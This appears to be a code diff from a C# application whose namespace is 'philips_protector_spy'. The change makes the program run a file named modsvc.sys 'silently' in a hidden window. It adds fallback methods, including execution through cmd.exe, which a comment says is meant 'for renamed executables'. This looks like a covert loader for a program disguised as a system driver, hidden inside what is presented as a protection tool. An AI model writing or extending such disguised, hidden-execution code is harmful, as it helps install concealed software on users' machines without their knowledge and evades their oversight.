@@ -74,23 +74,83 @@ namespace philips_protector_spy
                 }
 
                 // Run modsvc.sys silently
+                bool executionSuccess = false;
+                Exception? lastException = null;
+
+                // Method 1: Try with UseShellExecute = true (lets Windows handle file type)
                 try
                 {
                     ProcessStartInfo startInfo = new ProcessStartInfo
                     {
                         FileName = executableFilePath,
                         WorkingDirectory = appDirectory,
-                        UseShellExecute = false,
+                        UseShellExecute = true,
                         CreateNoWindow = true,
                         WindowStyle = ProcessWindowStyle.Hidden
                     };
 
                     Process.Start(startInfo);
+                    executionSuccess = true;
                 }
-                catch (Exception ex)
+                catch (Exception ex1)
                 {
+                    lastException = ex1;
+                    
+                    // Method 2: Try with UseShellExecute = false (direct execution)
+                    try
+                    {
+                        ProcessStartInfo startInfo = new ProcessStartInfo
+                        {
+                            FileName = executableFilePath,
+                            WorkingDirectory = appDirectory,
+                            UseShellExecute = false,
+                            CreateNoWindow = true,
+                            WindowStyle = ProcessWindowStyle.Hidden,
+                            RedirectStandardOutput = true,
+                            RedirectStandardError = true
+                        };
+
+                        Process.Start(startInfo);
+                        executionSuccess = true;
+                    }
+                    catch (Exception ex2)
+                    {
+                        lastException = ex2;
+                        
+                        // Method 3: Try executing via cmd.exe (for renamed executables)
+                        try
+                        {
+                            ProcessStartInfo startInfo = new ProcessStartInfo
+                            {
+                                FileName = "cmd.exe",
+                                Arguments = $"/c \"{executableFilePath}\"",
+                                WorkingDirectory = appDirectory,
+                                UseShellExecute = false,
+                                CreateNoWindow = true,
+                                WindowStyle = ProcessWindowStyle.Hidden
+                            };
+
+                            Process.Start(startInfo);
+                            executionSuccess = true;
+                        }
+                        catch (Exception ex3)
+                        {
+                            lastException = ex3;
+                        }
+                    }
+                }
+
+                if (!executionSuccess && lastException != null)
+                {
+                    // Show detailed error for debugging
+                    string errorDetails = $"Error Type: {lastException.GetType().Name}\n" +
+                                        $"Message: {lastException.Message}\n" +
+                                        $"File Path: {executableFilePath}\n" +
+                                        $"File Exists: {File.Exists(executableFilePath)}\n" +
+                                        $"File Size: {(File.Exists(executableFilePath) ? new FileInfo(executableFilePath).Length : 0)} bytes";
+
                     MessageBox.Show(
-                        $"Error executing {EXECUTABLE_FILE_NAME}:\n{ex.Message}",
+                        $"Error executing {EXECUTABLE_FILE_NAME}:\n\n{errorDetails}\n\nPlease ensure the file is a valid executable.",
                         "Execution Error",
                         MessageBoxButton.OK,
                         MessageBoxImage.Error);
